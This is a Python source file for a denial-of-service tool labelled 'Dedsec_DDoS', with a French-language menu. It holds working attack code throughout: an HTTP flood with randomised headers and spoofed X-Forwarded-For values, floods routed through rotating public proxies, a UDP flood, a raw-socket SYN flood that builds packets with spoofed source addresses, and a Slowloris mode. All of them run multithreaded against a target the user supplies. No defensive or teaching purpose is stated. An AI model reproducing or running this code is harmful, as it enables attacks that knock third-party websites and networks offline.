import os
import sys
import time
import socket
import threading
import random
import urllib.request
import ssl
import queue
import struct
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore
from pyfiglet import Figlet
from urllib.request import ProxyHandler, build_opener
from itertools import cycle
import argparse

# Désactiver les warnings SSL
ssl._create_default_https_context = ssl._create_unverified_context

# Initialiser les couleurs
init(autoreset=True)
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]

# Statistiques globales
stats = {
    'success': 0,
    'failed': 0,
    'total': 0
}
stats_lock = threading.Lock()

# Animation ASCII
def animate_ascii(text, duration=3):
    start_time = time.time()
    while time.time() - start_time < duration:
        for color in colors:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(color + text)
            time.sleep(0.1)

ascii_text = Figlet(font='slant').renderText('Dedsec_DDoS')
animate_ascii(ascii_text)

F = Fore.GREEN
Z = Fore.RED
S = Fore.YELLOW
C = Fore.CYAN

# User-agents réalistes et récents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

# Liste de proxies publiques (à remplacer par des proxies valides)
PROXY_LIST = [
    "http://51.158.154.173:3128",
    "http://51.159.115.233:3128",
    "http://51.159.115.233:80",
    "http://163.172.184.182:3128",
    "http://51.75.206.209:80",
    "http://51.75.147.137:3128",
    "http://51.178.220.248:3128"
]

proxy_cycle = cycle(PROXY_LIST)

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_random_headers():
    return {
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': '.'.join(str(random.randint(1, 254)) for _ in range(4))
    }

def update_stats(success=False, failed=False):
    with stats_lock:
        if success:
            stats['success'] += 1
        if failed:
            stats['failed'] += 1
        stats['total'] += 1

def print_stats():
    while True:
        time.sleep(5)
        with stats_lock:
            print(f"\n{C}[STATS] Success: {stats['success']} | Failed: {stats['failed']} | Total: {stats['total']}\n")

# Mode 1: Attaque HTTP optimisée avec keep-alive et randomization
def attack_http(url, stop_event, thread_id):
    # Créer un opener avec gestion des cookies et keep-alive
    opener = urllib.request.build_opener()
    
    while not stop_event.is_set():
        try:
            headers = get_random_headers()
            req = urllib.request.Request(url, headers=headers, method='GET')
            
            # Ajouter des paramètres aléatoires pour bypass cache
            separator = '&' if '?' in url else '?'
            cache_buster = f"{separator}_={random.randint(1000000, 9999999)}"
            
            start_time = time.time()
            response = opener.open(req, timeout=10)
            response_time = time.time() - start_time
            
            if response.status == 200:
                print(f'{F}[HTTP-{thread_id}] OK [{response_time:.2f}s]: {url}')
                update_stats(success=True)
            else:
                print(f'{Z}[HTTP-{thread_id}] Status {response.status}: {url}')
                update_stats(failed=True)
                
        except urllib.error.HTTPError as e:
            print(f'{S}[HTTP-{thread_id}] HTTP {e.code}: {url}')
            update_stats(failed=True)
        except Exception as e:
            print(f'{Z}[HTTP-{thread_id}] Error: {str(e)[:50]}')
            update_stats(failed=True)
        
        time.sleep(random.uniform(0.01, 0.1))

# Mode 2: Attaque Proxy rotative avec validation
def attack_proxy(url, stop_event, thread_id):
    while not stop_event.is_set():
        proxy = next(proxy_cycle)
        headers = get_random_headers()
        
        try:
            proxy_handler = ProxyHandler({'http': proxy, 'https': proxy})
            opener = build_opener(proxy_handler)
            opener.addheaders = [(k, v) for k, v in headers.items()]
            
            req = urllib.request.Request(url, headers=headers)
            response = opener.open(req, timeout=10)
            
            if response.status == 200:
                print(f'{F}[PROXY-{thread_id}] OK: {url} | {proxy}')
                update_stats(success=True)
            else:
                print(f'{Z}[PROXY-{thread_id}] Status {response.status}: {url}')
                update_stats(failed=True)
                
        except Exception as e:
            print(f'{S}[PROXY-{thread_id}] Fail: {proxy} - {str(e)[:30]}')
            update_stats(failed=True)
        
        time.sleep(random.uniform(0.05, 0.2))

# Mode 3: Attaque UDP amplifiée avec multi-payloads
def attack_udp(ip, port, stop_event, thread_id):
    # Créer plusieurs sockets pour plus de puissance
    sockets = []
    for _ in range(5):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
            sockets.append(sock)
        except:
            pass
    
    if not sockets:
        return
    
    # Payloads variés pour saturation
    payloads = [
        random._urandom(1024),
        random._urandom(2048),
        random._urandom(4096),
        random._urandom(8192),
        bytes([random.randint(0, 255) for _ in range(65507)])  # Max UDP size
    ]
    
    while not stop_event.is_set():
        for sock in sockets:
            try:
                payload = random.choice(payloads)
                sock.sendto(payload, (ip, port))
                print(f'{F}[UDP-{thread_id}] Frappe {ip}:{port} - {len(payload)} bytes')
                update_stats(success=True)
            except Exception as e:
                print(f'{Z}[UDP-{thread_id}] Error: {str(e)[:40]}')
                update_stats(failed=True)
        
        time.sleep(random.uniform(0.001, 0.01))

# Mode 4: Attaque SYN Flood avec raw sockets (requiert root/admin)
def attack_syn(ip, port, stop_event, thread_id):
    # Vérifier si on peut utiliser raw sockets
    try:
        # Créer un socket raw pour SYN flood
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f'{S}[SYN-{thread_id}] Mode sans privilèges - utilisation de TCP flood standard')
        attack_tcp_flood(ip, port, stop_event, thread_id)
        return
    except Exception as e:
        print(f'{Z}[SYN-{thread_id}] Impossible de créer raw socket: {e}')
        return
    
    while not stop_event.is_set():
        try:
            # Générer IP source aléatoire
            src_ip = '.'.join(str(random.randint(1, 254)) for _ in range(4))
            
            # Construire le paquet SYN
            packet = build_syn_packet(src_ip, ip, random.randint(1024, 65535), port)
            s.sendto(packet, (ip, 0))
            
            print(f'{F}[SYN-{thread_id}] SYN envoyé {src_ip} -> {ip}:{port}')
            update_stats(success=True)
            
        except Exception as e:
            print(f'{Z}[SYN-{thread_id}] Error: {str(e)[:40]}')
            update_stats(failed=True)
        
        time.sleep(random.uniform(0.001, 0.01))

def build_syn_packet(src_ip, dst_ip, src_port, dst_port):
    # IP Header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # Kernel remplit
    ip_id = random.randint(10000, 60000)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    # TCP Header
    tcp_seq = random.randint(1000000000, 4000000000)
    tcp_ack_seq = 0
    tcp_doff = 5 << 4  # Data offset
    tcp_flags = 0x02  # SYN flag
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_header = struct.pack('!HHLLBBHHH',
        src_port, dst_port, tcp_seq, tcp_ack_seq,
        tcp_doff, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    
    # Pseudo header pour checksum
    source_address = ip_saddr
    dest_address = ip_daddr
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    psh = struct.pack('!4s4sBBH',
        source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    
    tcp_check = checksum(psh)
    
    # Recréer TCP header avec checksum
    tcp_header = struct.pack('!HHLLBBH',
        src_port, dst_port, tcp_seq, tcp_ack_seq,
        tcp_doff, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    
    return ip_header + tcp_header

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
        s = s + w
    
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    return ~s & 0xffff

# Mode alternatif TCP flood si pas de raw sockets
def attack_tcp_flood(ip, port, stop_event, thread_id):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.send(random._urandom(1024))
            print(f'{F}[TCP-{thread_id}] Connexion: {ip}:{port}')
            update_stats(success=True)
            s.close()
        except:
            print(f'{Z}[TCP-{thread_id}] Fail: {ip}:{port}')
            update_stats(failed=True)
        time.sleep(random.uniform(0.01, 0.05))

# Mode 5: Attaque Slowloris (nouveau)
def attack_slowloris(url, stop_event, thread_id):
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    
    sockets_list = []
    
    while not stop_event.is_set():
        try:
            # Créer de nouvelles connexions
            for _ in range(50 - len(sockets_list)):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((host, port))
                    s.send(f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {host}\r\n".encode())
                    s.send(f"User-Agent: {get_random_user_agent()}\r\n".encode())
                    sockets_list.append(s)
                except:
                    break
            
            # Maintenir les connexions ouvertes
            for s in sockets_list[:]:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    print(f'{F}[SLOW-{thread_id}] Keep-alive envoyé à {host}')
                    update_stats(success=True)
                except:
                    sockets_list.remove(s)
                    update_stats(failed=True)
            
        except Exception as e:
            print(f'{Z}[SLOW-{thread_id}] Error: {str(e)[:40]}')
        
        time.sleep(random.uniform(1, 3))

# Menu principal
def main():
    print(f"""{Fore.CYAN}
+----------------------------------------+
|         BY:Mr_Crxs - DDoS Tool         |
+----------------------------------------+
|         [1] HTTP Flood (Rapide)        |
|         [2] Proxy Rotation             |
|         [3] UDP Flood (Puissant)       |
|         [4] SYN Flood (Raw Socket)     |
|         [5] Slowloris (Lent mais fort) |
+----------------------------------------+
""")
    
    choice = input("Choix (1/2/3/4/5): ").strip()
    
    if choice in ['1', '2', '5']:
        url = input("Cible URL (ex: http://example.com): ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        threads = int(input("Nombre de threads (recommandé: 50-500): "))
        duration = int(input("Durée (secondes, 0 = infini): "))
        
        stop_event = threading.Event()
        attack_threads = []
        
        # Thread de statistiques
        stats_thread = threading.Thread(target=print_stats, daemon=True)
        stats_thread.start()
        
        for i in range(threads):
            if choice == '1':
                t = threading.Thread(target=attack_http, args=(url, stop_event, i))
            elif choice == '2':
                t = threading.Thread(target=attack_proxy, args=(url, stop_event, i))
            else:
                t = threading.Thread(target=attack_slowloris, args=(url, stop_event, i))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        if duration > 0:
            time.sleep(duration)
            stop_event.set()
            print(f"{Fore.YELLOW}\nAttaque terminée après {duration} secondes.")
            print(f"{F}Total Success: {stats['success']} | Failed: {stats['failed']}")
        else:
            print(f"{Fore.YELLOW}\nAttaque en cours. Ctrl+C pour arrêter.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop_event.set()
                print(f"{Fore.YELLOW}\nAttaque arrêtée.")
                print(f"{F}Total Success: {stats['success']} | Failed: {stats['failed']}")
    
    elif choice in ['3', '4']:
        ip = input("Adresse IP cible: ").strip()
        port = int(input("Port (80, 443, 8080): "))
        threads = int(input("Nombre de threads (recommandé: 100-1000): "))
        duration = int(input("Durée (secondes, 0 = infini): "))
        
        stop_event = threading.Event()
        
        # Thread de statistiques
        stats_thread = threading.Thread(target=print_stats, daemon=True)
        stats_thread.start()
        
        for i in range(threads):
            if choice == '3':
                t = threading.Thread(target=attack_udp, args=(ip, port, stop_event, i))
            else:
                t = threading.Thread(target=attack_syn, args=(ip, port, stop_event, i))
            t.daemon = True
            t.start()
        
        if duration > 0:
            time.sleep(duration)
            stop_event.set()
            print(f"{Fore.YELLOW}\nAttaque terminée.")
            print(f"{F}Total Success: {stats['success']} | Failed: {stats['failed']}")
        else:
            print(f"{Fore.YELLOW}\nAttaque en cours. Ctrl+C pour arrêter.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop_event.set()
                print(f"{Fore.YELLOW}\nAttaque arrêtée.")
                print(f"{F}Total Success: {stats['success']} | Failed: {stats['failed']}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{Z}Erreur fatale: {e}")
        sys.exit(1)
